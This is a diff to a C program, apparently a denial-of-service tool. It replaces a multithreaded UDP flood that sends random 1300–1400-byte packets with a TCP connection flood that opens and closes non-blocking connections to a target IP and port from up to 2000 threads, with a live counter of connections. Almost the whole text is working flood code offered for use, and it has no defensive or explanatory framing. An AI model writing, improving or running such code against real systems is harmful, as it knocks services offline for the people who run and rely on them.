@@ -8,33 +8,47 @@
 #include <fcntl.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <errno.h>
 
 #define MAX_THREADS 2000
-#define MIN_PACKET_SIZE 1300
-#define MAX_PACKET_SIZE 1400
 #define EXPIRATION_YEAR 2028
 #define EXPIRATION_MONTH 4
 #define EXPIRATION_DAY 15
 
 int keep_running = 1;
+volatile unsigned long total_connections = 0;
 
 typedef struct {
-    int socket_fd;
     char *target_ip;
     int target_port;
     int duration;
+    int thread_id;
 } attack_params;
 
 void handle_signal(int sig) {
     keep_running = 0;
 }
 
-void *udp_flood(void *args) {
+int create_tcp_socket() {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+    
+    // Set non-blocking for fast connect
+    fcntl(sock, F_SETFL, O_NONBLOCK);
+    
+    // Reuse address and port
+    int reuse = 1;
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+    
+    return sock;
+}
+
+void *tcp_flood(void *args) {
     attack_params *params = (attack_params *)args;
     struct sockaddr_in target;
-    char buffer[MAX_PACKET_SIZE];
     unsigned int seed = time(NULL) ^ pthread_self();
     time_t end_time = time(NULL) + params->duration;
+    unsigned long connections = 0;
 
     memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
@@ -42,36 +56,29 @@ void *udp_flood(void *args) {
     inet_pton(AF_INET, params->target_ip, &target.sin_addr);
 
     while (keep_running && time(NULL) < end_time) {
-        int packet_size = MIN_PACKET_SIZE + rand_r(&seed) % (MAX_PACKET_SIZE - MIN_PACKET_SIZE + 1);
-        for (int i = 0; i < packet_size; i++) {
-            buffer[i] = rand_r(&seed) % 256;
+        int sock = create_tcp_socket();
+        if (sock < 0) continue;
+
+        // Fast non-blocking connect
+        int result = connect(sock, (struct sockaddr *)&target, sizeof(target));
+        
+        if (result < 0 && errno != EINPROGRESS) {
+            close(sock);
+            continue;
         }
 
-        sendto(params->socket_fd, buffer, packet_size, MSG_DONTWAIT,
-               (struct sockaddr *)&target, sizeof(target));
-    }
-
-    close(params->socket_fd);
-    return NULL;
-}
-
-int bind_random_source_port() {
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) return -1;
-
-    struct sockaddr_in src_addr;
-    memset(&src_addr, 0, sizeof(src_addr));
-    src_addr.sin_family = AF_INET;
-    src_addr.sin_addr.s_addr = INADDR_ANY;
-    src_addr.sin_port = htons((rand() % 64511) + 1024); // Random port 1024–65535
-
-    if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
+        // Immediate close - no data sending
         close(sock);
-        return -1;
+        connections++;
+        
+        // Small delay to avoid overwhelming system
+        if (connections % 100 == 0) {
+            usleep(1000);
+        }
     }
 
-    fcntl(sock, F_SETFL, O_NONBLOCK);
-    return sock;
+    __sync_fetch_and_add(&total_connections, connections);
+    return NULL;
 }
 
 int main(int argc, char *argv[]) {
@@ -107,35 +114,31 @@ int main(int argc, char *argv[]) {
     pthread_t threads[MAX_THREADS];
     attack_params params[MAX_THREADS];
 
-    printf("Attack started on %s:%d for %d seconds using %d threads.\n",
+    printf("TCP Flood started on %s:%d for %d seconds using %d threads\n",
            target_ip, target_port, duration, thread_count);
 
     for (int i = 0; i < thread_count; i++) {
-        int sock;
-        int retries = 10;
-        while ((sock = bind_random_source_port()) < 0 && retries--) {
-            usleep(1000); // retry bind
-        }
-
-        if (sock < 0) {
-            perror("Failed to bind random source port");
-            continue;
-        }
-
         params[i] = (attack_params){
             .target_ip = target_ip,
             .target_port = target_port,
             .duration = duration,
-            .socket_fd = sock
+            .thread_id = i
         };
+        pthread_create(&threads[i], NULL, tcp_flood, &params[i]);
+    }
 
-        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
+    // Progress reporting
+    time_t start_time = time(NULL);
+    while (keep_running && (time(NULL) - start_time) < duration) {
+        sleep(1);
+        printf("\rConnections: %lu | Running: %lds", total_connections, time(NULL) - start_time);
+        fflush(stdout);
     }
 
     for (int i = 0; i < thread_count; i++) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("Attack finished.\n");
+    printf("\nFinished: %lu total connections\n", total_connections);
     return EXIT_SUCCESS;
 }
